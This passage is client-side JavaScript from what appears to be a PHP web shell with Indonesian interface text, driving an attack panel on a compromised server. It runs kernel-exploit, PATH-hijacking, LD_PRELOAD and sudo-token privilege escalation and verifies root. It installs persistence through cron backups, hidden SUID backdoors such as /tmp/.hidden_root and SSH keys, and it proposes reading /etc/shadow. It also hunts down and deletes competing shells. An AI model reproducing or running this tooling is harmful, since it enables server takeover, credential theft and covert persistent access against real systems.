            const execForm = new FormData();
            execForm.append('cmd', execCmd);
            execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const execResponse = await fetch('', { method: 'POST', body: execForm });
            const execHtml = await execResponse.text();
            
            outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Exploit execution result:</span>\n';
            outputDiv.innerHTML += execHtml.substring(0, 2000);
            
            // Verify root with strict checks
            const verifyForm = new FormData();
            verifyForm.append('cmd', 'id');
            verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            const verifyResponse = await fetch('', { method: 'POST', body: verifyForm });
            const verifyHtml = await verifyResponse.text();
            
            // Strict check: must contain exact string 'uid=0(root)'
            const isReallyRoot = verifyHtml.includes('uid=0(root)');
            
            if (isReallyRoot) {
                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified)</span>\n';
                outputDiv.innerHTML += '<span style="color:#0f0;">uid=0(root) confirmed</span>\n';
                outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ Interactive Root Terminal activated below!</span>\n';
                statusDiv.className = 'privesc-status success';
                statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve + ' (No persistence)';
                
                // 🎯 TAMPILKAN INTERACTIVE ROOT TERMINAL
                showRootTerminal();
            } else {
                outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root access</span>\n';
                outputDiv.innerHTML += '<span style="color:#888;">Current user: ' + verifyHtml.substring(0, 200) + '</span>\n';
                outputDiv.innerHTML += '<span style="color:#ff0;">💡 Tips: Try running exploit manually or check if system is patched</span>\n';
                statusDiv.innerHTML = '⚠️ Exploit executed but no root (False Positive)';
            }
        } else {
            outputDiv.innerHTML += '\n<span style="color:#f44;">❌ Auto-deploy failed:</span>\n' + data.output + '\n';
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ All auto methods failed';
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

async function hijackPathAttack() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[PATH HIJACKING] Searching for writable directories in PATH...</span>\n';
    
    try {
        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=path_hijacking');
        const data = await response.json();
        
        if (data.data?.vulnerable) {
            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Found ' + data.data.writable_dirs.length + ' writable PATH dirs!</span>\n';
            
            for (const dir of data.data.writable_dirs) {
                outputDiv.innerHTML += '  → <span style="color:#ff0;">' + dir + '</span>\n';
                
                // Execute the hijack
                const formData = new FormData();
                formData.append('action', 'privesc_exploit');
                formData.append('method', 'path_hijacking');
                formData.append('target', JSON.stringify({ path: dir }));
                
                const execResponse = await fetch('', { method: 'POST', body: formData });
                const execData = await execResponse.json();
                
                if (execData.success) {
                    outputDiv.innerHTML += '<span style="color:#0f0;">[+] Hijacked: ' + dir + '/ls</span>\n';
                    outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
                    
                    const isRoot = await verifyRootAccess();
                    if (isRoot) {
                        outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                        outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                        outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
                        showRootTerminal();
                        return;
                    } else {
                        // Show actual user for debugging
                        const verifyForm = new FormData();
                        verifyForm.append('cmd', 'id');
                        verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
                        const verifyResp = await fetch('', { method: 'POST', body: verifyForm });
                        const verifyHtml = await verifyResp.text();
                        const uidMatch = verifyHtml.match(/uid=\d+\([^)]+\)/);
                        outputDiv.innerHTML += '<span style="color:#f44;">[!] Still: ' + (uidMatch ? uidMatch[0] : 'not root') + '</span>\n';
                    }
                }
            }
        } else {
            outputDiv.innerHTML += '<span style="color:#f44;">❌ No writable PATH directories found</span>\n';
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
    }
}

async function ldPreloadAttack() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[LD_PRELOAD] Checking for LD_PRELOAD vulnerabilities...</span>\n';
    
    try {
        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=ld_preload');
        const data = await response.json();
        
        if (data.data?.vulnerable) {
            outputDiv.innerHTML += '<span style="color:#0f0;">✅ LD_PRELOAD is exploitable!</span>\n';
            
            const formData = new FormData();
            formData.append('action', 'privesc_exploit');
            formData.append('method', 'ld_preload');
            formData.append('target', '');
            
            outputDiv.innerHTML += '<span style="color:#6cf;">[+] Creating malicious shared object...</span>\n';
            
            const execResponse = await fetch('', { method: 'POST', body: formData });
            const execData = await execResponse.json();
            
            if (execData.success) {
                outputDiv.innerHTML += '<span style="color:#0f0;">[+] Malicious .so injected!</span>\n';
                outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
                
                const isRoot = await verifyRootAccess();
                if (isRoot) {
                    outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                    outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                    outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
                    showRootTerminal();
                } else {
                    outputDiv.innerHTML += '<span style="color:#f44;">[!] LD_PRELOAD injected but no root</span>\n';
                }
            } else {
                outputDiv.innerHTML += '<span style="color:#f44;">[!] Failed: ' + execData.output + '</span>\n';
            }
        } else {
            outputDiv.innerHTML += '<span style="color:#f44;">❌ LD_PRELOAD not exploitable</span>\n';
            if (data.data?.methods?.length > 0) {
                outputDiv.innerHTML += '<span style="color:#888;">Methods found: ' + data.data.methods.length + '</span>\n';
            }
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
    }
}

async function sudoTokenAttack() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[SUDO TOKEN] Checking for active sudo tokens...</span>\n';
    
    try {
        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=sudo_token');
        const data = await response.json();
        
        if (data.data?.has_token) {
            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Active sudo token found!</span>\n';
            outputDiv.innerHTML += '<span style="color:#ff0;">Token expires in: ' + data.data.timeout + ' seconds</span>\n';
            
            const formData = new FormData();
            formData.append('action', 'privesc_exploit');
            formData.append('method', 'sudo_token');
            formData.append('target', '');
            
            outputDiv.innerHTML += '<span style="color:#6cf;">[+] Reusing sudo token...</span>\n';
            
            const execResponse = await fetch('', { method: 'POST', body: formData });
            const execData = await execResponse.json();
            
            outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
            
            const isRoot = await verifyRootAccess();
            if (isRoot) {
                outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
                showRootTerminal();
            } else {
                outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired or not root)</span>\n';
            }
        } else {
            outputDiv.innerHTML += '<span style="color:#f44;">❌ No active sudo tokens found</span>\n';
            outputDiv.innerHTML += '<span style="color:#888;">Run "sudo -v" in a real shell first, then try again</span>\n';
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
    }
}

// Shell Scanner Functions
async function scanOtherShells() {
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<div style="text-align:center;padding:30px;"><p style="font-size:30px;animation:pulse 1s infinite;">🕵️</p><p style="color:#0f0;">Scanning for other web shells...</p><p style="color:#888;font-size:11px;">This may take 30-60 seconds depending on directory size</p></div>';
    statusDiv.style.display = 'block';
    statusDiv.className = 'privesc-status';
    statusDiv.innerHTML = '⏳ Scanning PHP files for suspicious patterns...';
    
    try {
        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_shells');
        const data = await response.json();
        
        if (data.success) {
            displayShellScanResults(data);
            statusDiv.className = 'privesc-status success';
            statusDiv.innerHTML = '✅ Scan complete! Scanned ' + data.scanned + ' files, found ' + data.found + ' potential shells.';
        } else {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Scan failed: ' + (data.error || 'Unknown error') + '</span>';
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ Scan failed';
        }
    } catch (err) {
        outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + err.message + '</span>';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

function displayShellScanResults(data) {
    const outputDiv = document.getElementById('privescOutput');
    
    let html = '<div style="background:#1a1a1a;border:1px solid #f44;padding:15px;margin-bottom:15px;">';
    html += '<h3 style="color:#f44;margin:0 0 10px 0;">🕵️ SHELL SCAN RESULTS</h3>';
    html += '<p style="color:#888;margin:0;font-size:12px;">Scanned: ' + data.scanned + ' PHP files | Found: ' + data.found + ' potential shells</p>';
    if (data.recursive && data.max_depth !== undefined) {
        html += '<p style="color:#666;margin:5px 0 0 0;font-size:11px;">🔍 Recursive scan (max depth: ' + data.max_depth + ' levels)</p>';
    }
    html += '</div>';
    
    if (data.shells.length === 0) {
        html += '<div style="background:#001a00;border:1px solid #0f0;padding:15px;">';
        html += '<p style="color:#0f0;margin:0;">✅ No suspicious shells detected!</p>';
        html += '</div>';
    } else {
        data.shells.forEach((shell, index) => {
            const confidenceColor = shell.confidence >= 80 ? '#f44' : shell.confidence >= 50 ? '#ff0' : '#f80';
            const confidenceText = shell.confidence >= 80 ? 'HIGH' : shell.confidence >= 50 ? 'MEDIUM' : 'LOW';
            
            html += '<div style="border:1px solid ' + confidenceColor + ';margin:10px 0;padding:12px;background:#1a1a1a;border-radius:4px;">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
            html += '<h4 style="color:' + confidenceColor + ';margin:0;font-size:13px;">' + (index + 1) + '. ' + shell.filename + '</h4>';
            html += '<span style="background:' + confidenceColor + ';color:#000;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold;">' + confidenceText + ' (' + shell.confidence + '%)</span>';
            html += '</div>';
            
            html += '<p style="color:#6cf;margin:5px 0;font-size:11px;word-break:break-all;">📁 ' + shell.path + '</p>';
            if (shell.relative_path && shell.depth !== undefined) {
                html += '<p style="color:#666;margin:5px 0;font-size:10px;">📂 Relative: ' + shell.relative_path + ' (Depth: ' + shell.depth + ')</p>';
            }
            html += '<p style="color:#888;margin:5px 0;font-size:11px;">📊 Size: ' + formatBytes(shell.size) + ' | 📅 Modified: ' + shell.modified + '</p>';
            
            html += '<p style="color:#ff0;margin:5px 0;font-size:11px;">⚠️ Reasons:</p>';
            html += '<ul style="margin:5px 0;color:#888;font-size:11px;">';
            shell.reasons.forEach(reason => {
                html += '<li>' + reason + '</li>';
            });
            html += '</ul>';
            
            html += '<div style="margin-top:10px;display:flex;gap:10px;">';
            html += '<button onclick="jumpToShellLocation(\'' + encodeURIComponent(shell.dir) + '\')" style="background:#0f0;color:#000;padding:5px 15px;border:none;cursor:pointer;font-size:11px;font-weight:bold;">📂 Jump to Location</button>';
            html += '<button onclick="deleteShellFile(\'' + encodeURIComponent(shell.path) + '\', \'' + encodeURIComponent(shell.filename) + '\')" style="background:#f44;color:#fff;padding:5px 15px;border:none;cursor:pointer;font-size:11px;font-weight:bold;">🗑️ Delete File</button>';
            html += '</div>';
            
            html += '</div>';
        });
    }
    
    outputDiv.innerHTML = html;
}

function jumpToShellLocation(dir) {
    const decodedDir = decodeURIComponent(dir);
    navigateToDir(decodedDir);
    closeModal('privescModal');
}

async function deleteShellFile(path, filename) {
    const decodedPath = decodeURIComponent(path);
    const decodedFilename = decodeURIComponent(filename);
    
    if (!confirm('⚠️ WARNING: Are you sure you want to delete "' + decodedFilename + '"?\n\nThis action cannot be undone!')) {
        return;
    }
    
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    statusDiv.innerHTML = '⏳ Deleting ' + decodedFilename + '...';
    
    try {
        const formData = new FormData();
        formData.append('action', 'delete_shell');
        formData.append('target', decodedPath);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            statusDiv.className = 'privesc-status success';
            statusDiv.innerHTML = '✅ ' + decodedFilename + ' deleted successfully!';
            // Refresh scan results
            setTimeout(() => scanOtherShells(), 1000);
        } else {
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ Failed to delete: ' + (data.error || 'Unknown error');
        }
    } catch (err) {
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

function installPersistence() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">⏳ Installing persistence mechanisms...</span>';
    
    const formData = new FormData();
    formData.append('action', 'install_persistence');
    
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = '<div style="background:#001a00;border:1px solid #0f0;padding:15px;margin-bottom:15px;">';
                html += '<h3 style="color:#0f0;margin:0 0 10px 0;">✅ PERSISTENCE BERHASIL DIINSTALL!</h3>';
                html += '<p style="color:#ff0;margin:0;font-size:12px;">⚠️ SIMPAN SEMUA INFORMASI INI SEBELUM MENUTUP BROWSER!</p>';
                html += '</div>';
                
                // Penjelasan perbedaan backup types
                html += '<div style="background:#1a1a1a;border:1px solid #6cf;padding:10px;margin-bottom:15px;">';
                html += '<p style="color:#6cf;margin:0;font-size:11px;"><strong>📚 PERBEDAAN BACKUP:</strong></p>';
                html += '<p style="color:#ccc;margin:5px 0 0 0;font-size:11px;">';
                html += '<span style="color:#0f0;">🟢 CRON (System Backups):</span> Di /tmp/, /var/tmp/ - untuk auto-restore jika shell dihapus<br>';
                html += '<span style="color:#ff0;">🟡 BACKUP (Web Backups):</span> Di folder shell - untuk akses browser cepat';
                html += '</p></div>';
                
                for (const [method, info] of Object.entries(data.methods)) {
                    const isInstalled = info.status === 'installed' || info.status === 'ready';
                    const borderColor = isInstalled ? '#0f0' : '#f44';
                    const icon = isInstalled ? '✅' : '❌';
                    
                    html += '<div style="border:1px solid ' + borderColor + ';margin:10px 0;padding:12px;background:#1a1a1a;border-radius:4px;">';
                    html += '<h4 style="color:' + borderColor + ';margin:0 0 8px 0;">' + icon + ' ' + method.toUpperCase() + '</h4>';
                    
                    if (info.description) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📋 ' + info.description + '</p>';
                    }
                    
                    if (info.path) {
                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">📁 <strong>Path:</strong> ' + info.path + '</p>';
                    }
                    
                    if (info.locations && info.locations.length > 0) {
                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">📁 <strong>Backup Locations:</strong></p>';
                        html += '<ul style="margin:5px 0;color:#6cf;font-size:11px;">';
                        info.locations.forEach(loc => {
                            html += '<li>' + loc + '</li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.access_urls && info.access_urls.length > 0) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔗 <strong>Akses via Browser:</strong></p>';
                        html += '<ul style="margin:5px 0;">';
                        info.access_urls.forEach(url => {
                            html += '<li style="margin:3px 0;"><a href="' + url + '" target="_blank" style="color:#0f0;font-size:11px;word-break:break-all;">' + url + '</a></li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.access_url) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔗 <strong>URL:</strong> <a href="' + info.access_url + '" target="_blank" style="color:#0f0;word-break:break-all;">' + info.access_url + '</a></p>';
                    }
                    
                    if (info.how_to_use) {
                        html += '<div style="background:#000;padding:8px;margin:8px 0;border-left:3px solid #ff0;">';
                        html += '<p style="color:#ff0;margin:0;font-size:11px;">💡 <strong>CARA PAKAI:</strong></p>';
                        html += '<p style="color:#ccc;margin:5px 0 0 0;font-size:11px;">' + info.how_to_use + '</p>';
                        html += '</div>';
                    }
                    
                    // Tampilkan system backups untuk cron
                    if (info.system_backups && info.system_backups.length > 0) {
                        html += '<p style="color:#f80;margin:5px 0;font-size:11px;">🔒 <strong>System Backup Paths (untuk Cron):</strong></p>';
                        html += '<ul style="margin:5px 0;color:#f80;font-size:11px;">';
                        info.system_backups.forEach(bak => {
                            html += '<li>' + bak.path + '</li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.manual_cmd) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">⌨️ <strong>Check:</strong> <code style="background:#000;padding:2px 5px;">' + info.manual_cmd + '</code></p>';
                    }
                    
                    if (info.private_key_path) {
                        html += '<p style="color:#f80;margin:5px 0;font-size:11px;">🔑 <strong>Private Key:</strong> ' + info.private_key_path + '</p>';
                    }
                    
                    if (info.access_example) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📝 <strong>Example:</strong> ' + info.access_example + '</p>';
                    }
                    
                    if (info.private_key_url) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔑 <strong>Private Key:</strong> <a href="' + info.private_key_url + '" target="_blank" style="color:#0f0;word-break:break-all;">' + info.private_key_url + '</a></p>';
                    }
                    
                    if (info.note) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📝 <strong>Note:</strong> ' + info.note + '</p>';
                    }
                    
                    if (info.method) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">⚙️ <strong>Method:</strong> ' + info.method + '</p>';
                    }
                    
                    // Show debug log for suid_backdoor if available
                    if (method === 'suid_backdoor' && info.debug_log) {
                        html += '<div style="margin-top:10px;">';
                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">🔍 <strong>Debug Log:</strong></p>';
                        html += '<textarea readonly style="width:100%;height:200px;background:#000;color:#888;border:1px solid #333;padding:8px;font-family:monospace;font-size:10px;resize:vertical;overflow:auto;">' + escapeHtml(info.debug_log) + '</textarea>';
                        html += '</div>';
                    }
                    
                    html += '</div>';
                }
                
                html += '<div style="background:#2a0000;border:1px solid #f44;padding:15px;margin-top:15px;">';
                html += '<p style="color:#f44;margin:0;font-size:12px;">⚠️ <strong>PERINGATAN:</strong> ' + (data.warning || 'Simpan informasi ini dengan aman!') + '</p>';
                html += '</div>';
                
                // REKAP SEMUA URL SHELL
                if (data.all_urls && data.all_urls.length > 0) {
                    const urlsText = data.all_urls.join('\n');
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#0f0;margin:0 0 10px 0;">📋 SEMUA URL SHELL (Copy & Simpan!)</h4>';
                    html += '<textarea id="urlsTextarea" readonly style="width:100%;height:120px;background:#000;color:#0f0;border:1px solid #0f0;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + urlsText + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'urlsTextarea\')" style="margin-top:5px;background:#0f0;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy URL</button>';
                    html += '</div>';
                }
                
                // DOKUMENTASI LENGKAP
                if (data.documentation_content) {
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#6cf;margin:0 0 10px 0;">📖 DOKUMENTASI LENGKAP (Copy & Simpan!)</h4>';
                    html += '<textarea id="docTextarea" readonly style="width:100%;height:200px;background:#000;color:#6cf;border:1px solid #6cf;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + data.documentation_content + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'docTextarea\')" style="margin-top:5px;background:#6cf;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy Dokumentasi</button>';
                    html += '</div>';
                }
                
                // SSH DOKUMENTASI
                if (data.ssh_documentation) {
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#f80;margin:0 0 10px 0;">🔐 PANDUAN AKSES SSH (Copy & Simpan!)</h4>';
                    html += '<textarea id="sshTextarea" readonly style="width:100%;height:150px;background:#000;color:#f80;border:1px solid #f80;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + data.ssh_documentation + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'sshTextarea\')" style="margin-top:5px;background:#f80;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy SSH Guide</button>';
                    html += '</div>';
                }
                
                outputDiv.innerHTML = html;
            } else {
                outputDiv.innerHTML = '<span style="color:#f44;">❌ Failed to install persistence: ' + (data.error || 'Unknown error') + '</span>';
            }
        })
        .catch(error => {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + escapeHtml(error.message) + '</span>';
        });
}

// 🎯 INTERACTIVE ROOT TERMINAL FUNCTIONS
let suidBackdoorPath = null;  // Simpan path SUID backdoor jika ada
let rootTerminalActive = false;

// Tampilkan terminal setelah root berhasil
function showRootTerminal() {
    const terminal = document.getElementById('rootTerminal');
    const output = document.getElementById('rootTerminalOutput');
    
    terminal.style.display = 'block';
    output.innerHTML = `<span style="color:#0f0;font-weight:bold;">🎉 ROOT ACCESS GRANTED!</span>
<span style="color:#888;">═══════════════════════════════════════</span>
<span style="color:#ff0;">⚠️  CRITICAL: Root access is TEMPORARY!</span>
<span style="color:#f44;">   You MUST install persistence WHILE root is active!</span>

<span style="color:#6cf;">📋 REQUIRED STEPS:</span>
<span style="color:#ccc;">   1. Click 🔒 Persist button in the button row ABOVE ↑</span>
<span style="color:#ccc;">   2. Wait for installation to complete</span>
<span style="color:#ccc;">   3. SUID backdoor will be created (if root is active)</span>

<span style="color:#ff0;">⚠️ IMPORTANT: SUID backdoor may NOT work on all systems!</span>
<span style="color:#ccc;">   Kernel protections (nosuid, Yama LSM) can block SUID.</span>

<span style="color:#6cf;">✅ TO USE ROOT ACCESS:</span>
<span style="color:#0f0;">   Go to Shell tab → Run: /tmp/.hidden_root -c "id"</span>
<span style="color:#ccc;">   OR: /tmp/.sysd -c "cat /etc/shadow"</span>

<span style="color:#f80;">⏳ Waiting for persistence installation...</span>
<span style="color:#f44;">⚠️  DO NOT CLOSE THIS MODAL until installed!</span>`;
    
    // Auto-focus input
    document.getElementById('rootTerminalInput').focus();
    
    rootTerminalActive = true;
    suidBackdoorPath = null; // Reset path
    
    // Check if persistence already installed
    checkSuidBackdoor();
}

// Cek apakah SUID backdoor sudah terinstall
async function checkSuidBackdoor() {
    // Cek juga di hasil persist yang mungkin baru selesai
    const commonPaths = ['/tmp/.sysd', '/tmp/.hidden_root', '/tmp/.bash', '/dev/shm/.sysd', '/tmp/.al-sysd'];
    const output = document.getElementById('rootTerminalOutput');
    
    for (const path of commonPaths) {
        try {
            const formData = new FormData();
            formData.append('cmd', 'ls -la ' + path + ' 2>/dev/null');
            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData });
            const html = await response.text();
            
            // Parse output properly
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const outputEl = doc.querySelector('.output');
            const result = outputEl ? outputEl.textContent : '';
            
            // Check: must be owned by root AND have SUID bit
            // Example: -rwsr-xr-x 1 root root
            const hasRootOwner = result.includes('root');
            const hasSuidBit = /rws/.test(result); // s bit di owner execute position
            const hasFile = result.includes(path.split('/').pop());
            const notFound = result.includes('No such file') || result.includes('not found') || result.includes('cannot access');
            
            console.log('[RootTerminal] Checking', path, 'Result:', result.substring(0, 150));
            console.log('[RootTerminal]   hasRoot:', hasRootOwner, 'hasSUID:', hasSuidBit, 'hasFile:', hasFile, 'notFound:', notFound);
            
            if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                suidBackdoorPath = path;
                updateTerminalStatus('✅ SUID found - test with: ' + path + ' -c id', '#0f0');
                
                output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED!</span>
<span style="color:#0f0;">   Path: ${path}</span>
<span style="color:#6cf;">   Test in Shell tab with:</span>
<span style="color:#0f0;background:#000;padding:3px 8px;border:1px solid #0f0;display:inline-block;margin:5px 0;">${path} -c "id"</span>\n`;
                output.scrollTop = output.scrollHeight;
                return;
            }
        } catch (e) {
            console.log('[RootTerminal] Error checking', path, e);
        }
    }
    
    updateTerminalStatus('⚠️ Click 🔒 Persist, then use Shell tab if needed', '#f80');
}

// Update status terminal
function updateTerminalStatus(msg, color) {
    const status = document.getElementById('rootTerminalStatus');
    status.textContent = msg;
    status.style.color = color;
}

// Execute command via root terminal
async function executeRootCommand() {
    const input = document.getElementById('rootTerminalInput');
    const output = document.getElementById('rootTerminalOutput');
    const cmd = input.value.trim();
    
    if (!cmd) return;
    
    // Add command to output
    output.innerHTML += '\n<span style="color:#0f0;">root@server# ' + escapeHtml(cmd) + '</span>\n';
    
    // Add loading indicator
    const loadingId = 'loading_' + Date.now();
    output.innerHTML += '<span id="' + loadingId + '" style="color:#888;">⏳ Executing...</span>';
    output.scrollTop = output.scrollHeight;
    input.value = '';
    
    // Check if we have SUID backdoor
    if (!suidBackdoorPath) {
        await checkSuidBackdoor();
    }
    
    // Execute command
    try {
        if (suidBackdoorPath) {
            // 🎯 SOLUSI: Gunakan script file + SUID shell dengan argument
            // Method: /tmp/.hidden_root /tmp/script.sh
            const scriptFile = '/tmp/.al_' + Date.now() + '.sh';
            
            // Step 1: Create script file
            const scriptContent = '#!/bin/sh\n' + cmd + '\n';
            const createCmd = 'echo "' + btoa(scriptContent) + '" | base64 -d > ' + scriptFile + ' && chmod 755 ' + scriptFile;
            
            console.log('[RootTerminal] Creating script:', scriptFile);
            
            const formData1 = new FormData();
            formData1.append('cmd', createCmd);
            formData1.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            await fetch('', { method: 'POST', body: formData1 });
            
            // Step 2: Execute script dengan SUID shell sebagai argument
            // Cara ini lebih reliable daripada pipe atau redirect
            const execCmd = suidBackdoorPath + ' ' + scriptFile + ' 2>&1; echo "[EXITCODE:$?]"; rm -f ' + scriptFile;
            
            console.log('[RootTerminal] Executing:', execCmd);
            
            const formData2 = new FormData();
            formData2.append('cmd', execCmd);
            formData2.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData2 });
            const html = await response.text();
            
            // Remove loading indicator
            const loadingEl = document.getElementById(loadingId);
            if (loadingEl) loadingEl.remove();
            
            // Parse output
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const outputEl = doc.querySelector('.output');
            
            if (outputEl) {
                let result = outputEl.textContent.trim();
                console.log('[RootTerminal] Output:', result.substring(0, 100));
                
                // Check if ran as root
                const isRoot = result.includes('uid=0(root)') || 
                               (result.includes('root') && !result.includes('www-data') && !result.includes('uid=33'));
                
                if (!isRoot && (result.includes('www-data') || result.includes('uid=33'))) {
                    output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">⚠️ SUID NOT WORKING - KERNEL PROTECTION</span>\n\n';
                    output.innerHTML += '<span style="color:#ff0;">The SUID binary exists but kernel is blocking it.</span>\n';
                    output.innerHTML += '<span style="color:#ccc;">Possible causes: nosuid mount, Yama LSM, or other kernel hardening.</span>\n\n';
                    output.innerHTML += '<span style="color:#6cf;">✅ WORKAROUND - Use Main Shell Tab:</span>\n\n';
                    output.innerHTML += '<span style="color:#ccc;">1. CLOSE this Privilege Escalation modal</span>\n';
                    output.innerHTML += '<span style="color:#ccc;">2. Go to main "Shell" tab (top menu)</span>\n';
                    output.innerHTML += '<span style="color:#ccc;">3. Run this exact command:</span>\n\n';
                    output.innerHTML += '<div style="background:#000;border:2px solid #0f0;padding:10px;margin:10px 0;font-family:monospace;font-size:13px;">';
                    output.innerHTML += '<span style="color:#0f0;">' + suidBackdoorPath + ' -c "' + escapeHtml(cmd) + '"</span>';
                    output.innerHTML += '</div>\n\n';
                    output.innerHTML += '<span style="color:#ff0;">If still www-data, the SUID backdoor is NOT functional.</span>\n';
                    output.innerHTML += '<span style="color:#888;">You may need to use the exploit directly each time.</span>\n';
                } else {
                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
                }
            } else {
                output.innerHTML += '<span style="color:#f44;">[Error: Could not parse output]</span>\n';
            }
        } else {
            // No SUID backdoor
            const loadingEl = document.getElementById(loadingId);
            if (loadingEl) loadingEl.remove();
            
            output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">❌ SUID BACKDOOR NOT FOUND!</span>\n';
            output.innerHTML += '<span style="color:#ff0;">💡 Install persistence first.</span>\n\n';
            updateTerminalStatus('⚠️ Click 🔒 Persist button above!', '#f44');
        }
        
    } catch (err) {
        const loadingEl = document.getElementById(loadingId);
        if (loadingEl) loadingEl.remove();
        output.innerHTML += '<span style="color:#f44;">Error: ' + escapeHtml(err.message) + '</span>\n';
    }
    
    output.scrollTop = output.scrollHeight;
}

